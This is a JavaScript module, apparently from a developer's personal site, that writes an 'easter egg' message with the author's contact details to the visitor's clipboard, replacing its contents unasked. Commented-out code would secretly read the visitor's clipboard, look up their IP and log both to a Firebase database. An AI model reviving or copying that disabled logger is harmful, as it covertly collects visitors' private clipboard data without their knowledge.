const MSG = `Congratulations on discovering this easter egg! 🎉

I love adding small surprises like this to my projects. Since you're curious and detail-oriented enough to find this, I'd love to connect with you! 

Feel free to reach out:
Email: jaskaransingh.official7@gmail.com
LinkedIn: https://www.linkedin.com/in/jaskaran-singh7

- Jaskaran Singh`;

// import { getDatabase, ref, set } from "firebase/database";
// import { signInAnonymously } from "firebase/auth";
// import { app, auth } from "../../firebase/client";

// signInAnonymously(auth);

// async function logger(originalContent, ip) {
//   const database = getDatabase(app);
//   const timestamp = new Date().toLocaleString("en-IN", {
//     timeZone: "Asia/Kolkata",
//     year: "numeric",
//     month: "long",
//     day: "numeric",
//     hour: "2-digit",
//     minute: "2-digit",
//     second: "2-digit",
//     hour12: false
//   });
  
//   const clipboardId = `clipboard_${Date.now()}`;
//   await set(ref(database, "clipboard_contents/" + clipboardId), {
//     content: originalContent,
//     timestamp: timestamp + " (IST)",
//     ip: ip
//   });
// }

export async function write() {
  // const originalContent = await navigator.clipboard.readText();
  if (!sessionStorage.getItem('messageWritten')) {
    await navigator.clipboard.writeText(MSG);
    sessionStorage.setItem('messageWritten', 'true');
  }
  // const ipResponse = await fetch("https://api.ipify.org?format=json");
  // const ipData = await ipResponse.json();
  // await logger(originalContent, ipData.ip);
}